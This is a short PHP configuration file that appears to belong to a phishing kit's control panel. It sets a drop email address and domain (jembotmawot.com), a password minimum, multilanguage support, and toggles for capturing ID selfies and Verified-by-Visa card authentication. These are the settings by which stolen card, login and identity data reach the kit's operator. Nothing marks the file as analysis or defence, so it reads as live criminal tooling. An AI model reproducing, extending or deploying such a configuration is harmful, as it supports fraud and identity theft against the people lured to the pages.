<?php
/* [$$$-------------- Panel Settings --------------$$$] */
$pais_email = 'admin@jembotmawot.com';
$pais_userallow = 'false';
$pais_panel = 'jembotmawot.com';
$pais_minpass = '8';
$pais_multilang = 'lang_active';
$pais_selfie = 'selfie_active';
$pais_vbv = 'vbv_active';
$pais_access = 'jembotmawot.com';
?>